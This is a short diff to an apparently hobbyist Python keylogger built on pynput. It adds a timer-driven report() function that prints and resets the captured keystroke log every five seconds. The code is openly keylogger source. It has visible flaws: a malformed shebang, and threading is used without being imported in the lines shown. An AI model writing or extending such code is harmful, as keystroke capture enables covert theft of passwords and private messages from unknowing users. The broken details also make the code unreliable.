@@ -1,4 +1,4 @@
-#!usr/bin/env python
+#!usr/bin/python
 
 import pynput.keyboard
 log =""
@@ -14,6 +14,16 @@ def process_key_press(key):
             log=log+" "+str(key)+" "    
     
     print(log)
+
+
+#We are using threading concept to report the log for a certain period of time. This threading allowas the keyboard listener function to execute without any interruption and also it runs timer on other hand. 
+
+def report():  
+    global log
+    print(log)
+    log=" "
+    timer=threading.Timer(5, report)
+    timer.start()
 
 keyboard_listener=pynput.keyboard.Listener(on_press=process_key_press)
 
